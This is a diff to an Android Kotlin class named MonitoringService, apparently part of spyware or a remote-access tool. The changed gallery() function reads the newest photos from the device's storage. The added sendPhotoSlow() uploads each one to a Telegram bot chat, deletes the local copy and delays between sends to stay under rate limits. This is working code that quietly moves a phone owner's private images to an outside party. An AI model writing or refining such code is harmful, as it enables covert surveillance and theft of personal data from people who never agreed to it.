@@ -348,27 +348,41 @@ class MonitoringService : LifecycleService() {
         } catch (e: Exception) { sendMsg("❌ ${e.message}") }
     }
 
-    private fun gallery() {
-        try {
-            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 5")
-            var c = 0
-            cursor?.use {
-                while (it.moveToNext() && c < 5) {
-                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                    val fileUri = android.content.ContentUris.withAppendedId(uri, id)
-                    val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
-                    if (bytes != null) {
-                        val f = File(cacheDir, "gal_$id.jpg")
-                        f.writeBytes(bytes)
-                        sendPhoto(f)
-                    }
-                    c++
+   private fun gallery() {
+    try {
+        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 3")
+        var c = 0
+        cursor?.use {
+            while (it.moveToNext() && c < 3) {
+                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val fileUri = android.content.ContentUris.withAppendedId(uri, id)
+                val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
+                if (bytes != null) {
+                    val f = File(cacheDir, "gal_$id.jpg")
+                    f.writeBytes(bytes)
+                    sendPhotoSlow(f)   // ← slow version
                 }
+                c++
             }
-            if (c == 0) sendMsg("❌ No photos")
-        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
-    }
+        }
+        if (c == 0) sendMsg("❌ No photos")
+    } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+}
+
+// Telegram rate limit වළක්වන්න 1.5s delay
+private fun sendPhotoSlow(f: File) {
+    try {
+        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
+        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+            .addFormDataPart("chat_id", CHAT_ID)
+            .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
+            .build()
+        client.newCall(Request.Builder().url(url).post(body).build()).execute()
+        f.delete()
+        Thread.sleep(1500)
+    } catch (_: Exception) {}
+}
 
     private fun flash() {
         try {
